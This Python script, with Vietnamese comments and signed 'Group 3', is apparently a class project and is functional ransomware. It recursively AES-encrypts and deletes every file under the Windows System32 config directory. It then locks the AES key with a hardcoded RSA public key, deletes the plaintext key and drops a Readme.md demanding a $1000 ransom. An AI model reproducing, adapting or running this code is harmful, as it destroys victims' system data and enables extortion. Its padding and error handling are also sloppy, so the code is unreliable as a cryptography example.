from Crypto.Cipher import AES
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend
import os
import ctypes
import subprocess

# Hàm mã hóa file bằng AES
def encrypt_file(key, filename):
    chunksize = 64 * 1024
    output_filename = filename + '.encrypted'
    filesize = str(os.path.getsize(filename)).zfill(16)
    iv = os.urandom(16)

    encryptor = AES.new(key, AES.MODE_CBC, iv)

    with open(filename, 'rb') as infile:
        with open(output_filename, 'wb') as outfile:
            outfile.write(filesize.encode('utf-8'))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))

    return output_filename

# Hàm mã hóa file bằng RSA
def rsa_encrypt_file(input_file, output_file, public_key_file):
    # Đọc nội dung của file input vào bộ nhớ
    with open(input_file, "rb") as file:
        plaintext = file.read()

    # Load khóa công khai từ file .pem
    with open(public_key_file, "rb") as key_file:
        public_key = serialization.load_pem_public_key(
            key_file.read(),
            backend=default_backend()
        )

    # Mã hóa nội dung của file
    ciphertext = public_key.encrypt(
        plaintext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Ghi kết quả mã hóa vào file output
    with open(output_file, "wb") as file:
        file.write(ciphertext)


text = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqvu99H55HT5g5Nks7Q/d\nVaSXP2jGHYkInh//7SOFmxX3bzB5T34ULQBUnWdAvpoHf8rs3xScTA8S55kmSGKa\nE+BXr/OlDXsOc5x7Eju6TTD2n3rO4C+NzfIa1+cbFH0BfRGkqmjzw3h5hO9uNrwb\n/SofG6Fl0SqKuFpV5SIzRCMOm+wzJROa6+tytX9Np73API3Sj1o0O8ewOpaAsFEv\nUG4sFfLBhX9lI2lZlO/tlx1cWSzOid6tgA5dO3XiUXRIBbw+EEg7GBNzz807sACl\nA2RM+MvgR0RwFMNsbvqlaJLUmeTnBagwZqTcDTbmvPyM6wTcMgM+KPoqW7BNnd97\n6wIDAQAB\n-----END PUBLIC KEY-----"
# Mở tệp văn bản để ghi
with open("public_key.pem", "w") as file:
    file.write(text)

# Tạo khóa ngẫu nhiên
key = os.urandom(32)

with open('./Key_AES.txt', 'wb') as f:
    f.write(key)
    #print(key)

dir_path = 'C:\Windows\System32\config'
files = os.listdir(dir_path)
for root, dirs, files in os.walk(dir_path):
    for file in files:
        file_path = os.path.join(root, file)
        if file_path.endswith('.encrypted'):
            continue;
        try:
            encrypted_file = encrypt_file(key, file_path)
            os.remove(file_path)
        except:
            pass

input_file='./Key_AES.txt'
output_file='./Key_AES.txt.encrypt'
public_key_file='./public_key.pem'
rsa_encrypt_file(input_file, output_file, public_key_file)
os.remove(input_file)
text = "You must be pay 1000$ ransom for decrypt your computer.\n     If you paid, i would send file decrypt for you.\n            I look forward to ransom from you.\n                         Group 3"
# Mở tệp văn bản để ghi
with open("Readme.md", "w") as file:
    file.write(text)
